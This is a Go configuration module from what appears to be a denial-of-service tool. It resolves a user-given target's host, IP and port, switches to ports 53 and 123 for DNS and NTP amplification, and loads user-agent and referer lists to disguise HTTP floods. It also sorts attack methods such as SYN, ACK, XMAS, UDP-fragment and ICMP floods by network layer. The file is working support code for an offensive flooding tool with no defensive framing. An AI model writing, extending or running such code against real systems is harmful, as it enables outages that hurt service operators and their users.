package config

import (
	"bufio"
	"fmt"
	"net"
	"net/url"
	"os"
	"runtime"
	"strings"
)

func LoadFile(Path string, Default []string) []string {
	F, Err := os.Open(Path)
	if Err != nil {
		return Default
	}
	defer F.Close()

	var Lines []string
	S := bufio.NewScanner(F)
	for S.Scan() {
		Line := strings.TrimSpace(S.Text())
		if Line != "" && !strings.HasPrefix(Line, "#") {
			Lines = append(Lines, Line)
		}
	}
	if len(Lines) == 0 {
		return Default
	}
	return Lines
}

func Resolve(Cfg *DemonConfig) error {
	Raw := Cfg.Target
	if !strings.HasPrefix(Raw, "http://") && !strings.HasPrefix(Raw, "https://") {
		Raw = "https://" + Raw
	}

	U, Err := url.Parse(Raw)
	if Err != nil {
		return fmt.Errorf("invalid URL: %w", Err)
	}

	Cfg.Target = Raw
	Cfg.Scheme = U.Scheme
	Cfg.Host = U.Hostname()
	Cfg.Path = U.Path
	if Cfg.Path == "" {
		Cfg.Path = "/"
	}

	if U.Port() != "" {
		fmt.Sscanf(U.Port(), "%d", &Cfg.Port)
	} else {
		if Cfg.Scheme == "https" {
			Cfg.Port = 443
		} else {
			Cfg.Port = 80
		}
	}

	switch Cfg.Method {
	case MethodDNSAMP:
		Cfg.Port = 53
	case MethodNTPAMP:
		Cfg.Port = 123
	}

	Addrs, Err := net.LookupHost(Cfg.Host)
	if Err != nil {
		return fmt.Errorf("cannot resolve %s: %w", Cfg.Host, Err)
	}
	Cfg.IP = Addrs[0]

	Cfg.UserAgents = LoadFile("UA.txt", DefaultUserAgents)
	Cfg.Referers = LoadFile("Referers.txt", DefaultReferers)

	if Cfg.Workers == 0 {
		Cfg.Workers = runtime.NumCPU()
	}

	Cfg.Stats = &Stats{}
	return nil
}

func DetectLayer(M Method) Layer {
	switch M {
	case MethodICMP:
		return LayerL3
	case MethodTCP, MethodSYN, MethodACK, MethodRST, MethodFIN,
		MethodXMAS, MethodUDP, MethodUDPFRAG, MethodDNSAMP, MethodNTPAMP:
		return LayerL4
	default:
		return LayerL7
	}
}
